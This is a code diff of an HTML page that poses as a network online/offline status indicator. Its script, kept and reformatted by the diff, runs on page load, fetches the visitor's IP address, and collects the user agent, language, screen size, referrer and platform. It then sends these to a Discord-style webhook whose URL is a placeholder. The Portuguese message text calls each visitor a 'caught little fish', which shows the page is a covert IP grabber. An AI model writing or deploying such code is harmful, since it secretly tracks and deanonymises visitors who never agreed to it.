@@ -130,62 +130,71 @@ p {
     statusColor: 'green',
     secondSignalDelay: '0.2s',
     thirdSignalDelay: '0.4s'
-}
+  }
 
-const OFFLINE_THEME = {
+  const OFFLINE_THEME = {
     statusColor: 'orangered',
     secondSignalDelay: '0s',
     thirdSignalDelay: '0s'
-}
+  }
 
-function detectOnlineStatus() {
+  function detectOnlineStatus() {
     let theme = navigator.onLine ? ONLINE_THEME : OFFLINE_THEME
     let root = document.documentElement
     root.style.setProperty('--status-color', theme.statusColor)
     root.style.setProperty('--second-signal-delay', theme.secondSignalDelay)
     root.style.setProperty('--third-signal-delay', theme.thirdSignalDelay)
-}
+  }
 
-window.addEventListener('online', detectOnlineStatus)
-window.addEventListener('offline', detectOnlineStatus)
-detectOnlineStatus()
+  window.addEventListener('online', detectOnlineStatus)
+  window.addEventListener('offline', detectOnlineStatus)
+  detectOnlineStatus()
 
-fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        const ipAddress = data.ip;
-        const webhookUrl = 'webhook url aqui!!!!!!!';
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const ipAddress = data.ip;
+      const webhookUrl = 'WEBHOOK URL AQUI NÂO ME FAÇA FALAR DE NOVO!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!';
 
-        const userAgent = navigator.userAgent;
-        const language = navigator.language;
-        const screenWidth = window.screen.width;
-        const screenHeight = window.screen.height;
-        const referrer = document.referrer;
-        const operatingSystem = navigator.platform;
+      const userAgent = navigator.userAgent;
+      const language = navigator.language;
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+      const referrer = document.referrer;
+      const operatingSystem = navigator.platform;
+      const avatarUrl = 'https://cdn.lowgif.com/full/a80ec20303ef5e54-.gif';
 
-        const message = `@everyone Nova visita ao site! \nIP: ${ipAddress} \nUser-Agent: ${userAgent} \nLinguagem: ${language} \nScreen Resolução: ${screenWidth}x${screenHeight} \nReferrer: ${referrer} \nSistema Operacional: ${operatingSystem}`;
+      const message = `Novo peixinho pescado! 👉👈😋 \n[+]IP do peixinho: ${ipAddress} \n[+]User-Agent: ${userAgent} \n[+]Navegador Linguagem: ${language} \n[+]Resolução da tela: ${screenWidth}x${screenHeight} \n[+]Referência: ${referrer} \n[+]Sistema Operacional: ${operatingSystem} \nOBS: Se essa mensagem tiver menos de 5 dados provavelmente o peixinho está camuflado! \nCriador: Machine`;
 
-        fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            content: message,
-          }),
-        })
-        .then(response => {
-          console.log('Mensagem enviada com sucesso!');
-        })
-        .catch(error => {
-          console.error('Erro ao enviar a mensagem:', error);
-        });
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          embeds: [
+            {
+              description: message,
+              color: 16724787,
+              author: {
+                name: 'Garota do sistema',
+                icon_url: avatarUrl
+              }
+            }
+          ]
+        }),
+      })
+      .then(response => {
+        console.log('Mensagem enviada com sucesso!');
       })
       .catch(error => {
-        console.error('Erro ao obter o endereço IP:', error);
+        console.error('Erro ao enviar a mensagem:', error);
       });
+    })
+    .catch(error => {
+      console.error('Erro ao obter o endereço IP:', error);
+    });
 </script>
-
 </head>
 <body>
   <div class="detector">
